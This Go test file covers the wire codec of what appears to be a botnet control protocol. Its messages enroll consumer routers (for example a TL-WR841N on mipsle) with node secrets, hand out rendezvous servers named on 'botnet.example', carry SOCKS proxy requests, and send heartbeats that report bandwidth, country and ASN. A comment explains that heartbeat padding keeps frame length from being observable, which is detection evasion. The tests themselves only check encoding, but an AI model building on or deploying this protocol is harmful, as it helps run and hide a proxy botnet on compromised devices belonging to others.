package proto

import (
	"bytes"
	"errors"
	"testing"
)

func TestEnrollRequestRoundTrip(t *testing.T) {
	in := EnrollRequest{
		Arch: "mipsle", Model: "TL-WR841N", Firmware: "3.16.1",
		MAC: "a4:2b:b0:cf:3d:1e", CSRPEM: []byte("-----BEGIN CSR-----\nabc\n"),
	}
	b, err := in.Marshal()
	if err != nil {
		t.Fatalf("Marshal: %v", err)
	}
	var out EnrollRequest
	if err := out.Unmarshal(b); err != nil {
		t.Fatalf("Unmarshal: %v", err)
	}
	if out.Arch != in.Arch || out.Model != in.Model || out.Firmware != in.Firmware ||
		out.MAC != in.MAC || !bytes.Equal(out.CSRPEM, in.CSRPEM) {
		t.Fatalf("roundtrip: %+v != %+v", out, in)
	}
}

func TestEnrollResponseRoundTrip(t *testing.T) {
	in := EnrollResponse{
		Slug:    "k7qz2m4x9p1r",
		CertPEM: []byte("cert"), CAPEM: []byte("ca"),
		Rendezvous: []string{"rdv1.botnet.example:443", "rdv2.botnet.example:443"},
		TTLS:       86400,
	}
	copy(in.NodeID[:], []byte("0123456789abcdef"))
	copy(in.NodeSecret[:], bytes.Repeat([]byte{0x5a}, 32))
	b, err := in.Marshal()
	if err != nil {
		t.Fatalf("Marshal: %v", err)
	}
	var out EnrollResponse
	if err := out.Unmarshal(b); err != nil {
		t.Fatalf("Unmarshal: %v", err)
	}
	if out.NodeID != in.NodeID || out.NodeSecret != in.NodeSecret ||
		out.Slug != in.Slug || out.TTLS != in.TTLS ||
		!bytes.Equal(out.CertPEM, in.CertPEM) || !bytes.Equal(out.CAPEM, in.CAPEM) ||
		len(out.Rendezvous) != 2 || out.Rendezvous[1] != in.Rendezvous[1] {
		t.Fatalf("roundtrip mismatch: %+v != %+v", out, in)
	}
	if _, err := (&EnrollResponse{Rendezvous: make([]string, 256)}).Marshal(); !errors.Is(err, ErrInvalidLen) {
		t.Fatalf("rendezvous > 255: expected ErrInvalidLen, got %v", err)
	}
}

func TestHelloCapsRoundTrip(t *testing.T) {
	in := HelloCaps{BWMbps: 42, ISO2: "ES", ASN: 12345, DeviceClass: 'A'}
	b, err := in.Marshal()
	if err != nil {
		t.Fatalf("Marshal: %v", err)
	}
	var out HelloCaps
	if err := out.Unmarshal(b); err != nil {
		t.Fatalf("Unmarshal: %v", err)
	}
	if out != in {
		t.Fatalf("roundtrip: %+v != %+v", out, in)
	}
	if _, err := (&HelloCaps{ISO2: "ESB"}).Marshal(); !errors.Is(err, ErrInvalidLen) {
		t.Fatalf("iso2 > 2: expected ErrInvalidLen, got %v", err)
	}
}

func TestRdvAssignRoundTrip(t *testing.T) {
	in := RdvAssign{GatewayAddr: "gw3.example:443", SessionToken: bytes.Repeat([]byte{9}, 24), TTLS: 3600}
	b, err := in.Marshal()
	if err != nil {
		t.Fatalf("Marshal: %v", err)
	}
	var out RdvAssign
	if err := out.Unmarshal(b); err != nil {
		t.Fatalf("Unmarshal: %v", err)
	}
	if out.GatewayAddr != in.GatewayAddr || out.TTLS != in.TTLS || !bytes.Equal(out.SessionToken, in.SessionToken) {
		t.Fatalf("roundtrip mismatch: %+v != %+v", out, in)
	}
}

func TestSocksRoundTrip(t *testing.T) {
	g := SocksGreeting{Version: 0x05, Methods: []byte{0x00, 0x02}}
	b, err := g.Marshal()
	if err != nil {
		t.Fatalf("Marshal greeting: %v", err)
	}
	var g2 SocksGreeting
	if err := g2.Unmarshal(b); err != nil {
		t.Fatalf("Unmarshal greeting: %v", err)
	}
	if g2.Version != g.Version || !bytes.Equal(g2.Methods, g.Methods) {
		t.Fatalf("greeting roundtrip: %+v != %+v", g2, g)
	}
	r := SocksRequest{Command: 0x01, Address: "example.com", Port: 8443}
	b, err = r.Marshal()
	if err != nil {
		t.Fatalf("Marshal request: %v", err)
	}
	var r2 SocksRequest
	if err := r2.Unmarshal(b); err != nil {
		t.Fatalf("Unmarshal request: %v", err)
	}
	if r2 != r {
		t.Fatalf("request roundtrip: %+v != %+v", r2, r)
	}
}

func TestHeartbeatFrameShape(t *testing.T) {
	in := Heartbeat{
		Seq: 42, RssKiB: 3072, UptimeS: 86400, Streams: 3,
		LossEstimate: 120, AgentVer: "0.1.0",
	}
	copy(in.NodeID[:], []byte("fedcba9876543210"))
	b, err := in.Marshal()
	if err != nil {
		t.Fatalf("Marshal: %v", err)
	}
	// Núcleo fijo de 200 B + [padLen][pad]; el relleno hace que el total
	// varíe frame a frame (jamás una longitud fija observable, §5).
	if len(b) < HeartbeatCoreLen || len(b) > HeartbeatCoreLen+1+MaxHeartbeatPad {
		t.Fatalf("heartbeat wire length %d fuera de [%d, %d]", len(b), HeartbeatCoreLen, HeartbeatCoreLen+1+MaxHeartbeatPad)
	}
	var out Heartbeat
	if err := out.Unmarshal(b); err != nil {
		t.Fatalf("Unmarshal: %v", err)
	}
	if out.NodeID != in.NodeID || out.Seq != in.Seq || out.RssKiB != in.RssKiB ||
		out.UptimeS != in.UptimeS || out.Streams != in.Streams ||
		out.LossEstimate != in.LossEstimate || out.AgentVer != in.AgentVer {
		t.Fatalf("heartbeat roundtrip mismatch: %+v != %+v", out, in)
	}
	if len(out.Pad) > MaxHeartbeatPad {
		t.Fatalf("pad %d > %d", len(out.Pad), MaxHeartbeatPad)
	}
	// Con el Pad recuperado, Marshal es determinista: el contrato permite
	// reenviar el frame recibido sin regenerar aleatoriedad.
	b2, err := out.Marshal()
	if err != nil {
		t.Fatalf("re-Marshal: %v", err)
	}
	if !bytes.Equal(b, b2) {
		t.Fatal("re-Marshal no determinista con Pad preservado")
	}
}

func TestLengthRejection(t *testing.T) {
	hb := Heartbeat{AgentVer: "x"}
	b, err := hb.Marshal()
	if err != nil {
		t.Fatalf("Marshal heartbeat: %v", err)
	}
	var h Heartbeat
	if err := h.Unmarshal(b[:HeartbeatCoreLen-1]); !errors.Is(err, ErrInvalidLen) {
		t.Fatalf("heartbeat truncado: expected ErrInvalidLen, got %v", err)
	}
	if err := h.Unmarshal(append(append([]byte{}, b...), bytes.Repeat([]byte{1}, 60)...)); !errors.Is(err, ErrInvalidLen) {
		t.Fatalf("heartbeat demasiado largo: expected ErrInvalidLen, got %v", err)
	}
	// padLen declarado que no cuadra con la cola real
	bad := append([]byte{}, b...)
	bad = append(bad, 9, 9, 9)
	bad = bad[:HeartbeatCoreLen]
	bad = append(bad, 12, 9, 9, 9)
	if err := h.Unmarshal(bad); !errors.Is(err, ErrInvalidLen) {
		t.Fatalf("padLen incoherente: expected ErrInvalidLen, got %v", err)
	}

	er := EnrollRequest{Arch: "amd64", CSRPEM: bytes.Repeat([]byte{7}, 50)}
	eb, err := er.Marshal()
	if err != nil {
		t.Fatalf("Marshal enroll: %v", err)
	}
	var e2 EnrollRequest
	if err := e2.Unmarshal(eb[:len(eb)-3]); !errors.Is(err, ErrTruncated) {
		t.Fatalf("EnrollRequest truncado: expected ErrTruncated, got %v", err)
	}

	vb := append([]byte{}, eb...)
	vb[0] = CodecVersion + 99
	if err := e2.Unmarshal(vb); !errors.Is(err, ErrVersion) {
		t.Fatalf("version desconocida: expected ErrVersion, got %v", err)
	}
}

func TestCtrlFrameRoundTrip(t *testing.T) {
	payload, err := (&Heartbeat{Seq: 1, AgentVer: "0.1.0"}).Marshal()
	if err != nil {
		t.Fatalf("Marshal heartbeat payload: %v", err)
	}
	in := CtrlFrame{Type: FrameHeartbeat, Flags: 0x01, Seq: 7, Payload: payload}
	copy(in.NodeID[:], []byte("0123456789abcdef"))
	b, err := EncodeFrame(&in)
	if err != nil {
		t.Fatalf("EncodeFrame: %v", err)
	}
	out, err := DecodeFrame(b)
	if err != nil {
		t.Fatalf("DecodeFrame: %v", err)
	}
	if out.Type != in.Type || out.Flags != in.Flags || out.Seq != in.Seq ||
		out.NodeID != in.NodeID || !bytes.Equal(out.Payload, in.Payload) {
		t.Fatalf("frame roundtrip mismatch: %+v != %+v", out, in)
	}
}

func TestCtrlFrameLengthRejection(t *testing.T) {
	if _, err := EncodeFrame(&CtrlFrame{Payload: make([]byte, MaxFramePayload+1)}); !errors.Is(err, ErrInvalidLen) {
		t.Fatalf("payload > MaxFramePayload: expected ErrInvalidLen, got %v", err)
	}
	good, err := EncodeFrame(&CtrlFrame{Type: FramePing, Payload: []byte("ping")})
	if err != nil {
		t.Fatalf("EncodeFrame: %v", err)
	}
	if _, err := DecodeFrame(good[:frameHeaderLen-1]); !errors.Is(err, ErrInvalidLen) {
		t.Fatalf("frame corto: expected ErrInvalidLen, got %v", err)
	}
	if _, err := DecodeFrame(append(good, 0)); !errors.Is(err, ErrInvalidLen) {
		t.Fatalf("largo declarada != real: expected ErrInvalidLen, got %v", err)
	}
	ver := append([]byte{}, good...)
	ver[0] = CodecVersion + 42
	if _, err := DecodeFrame(ver); !errors.Is(err, ErrVersion) {
		t.Fatalf("version de frame: expected ErrVersion, got %v", err)
	}
	if _, err := DecodeFrame(nil); !errors.Is(err, ErrInvalidLen) {
		t.Fatalf("frame vacio: expected ErrInvalidLen, got %v", err)
	}
}
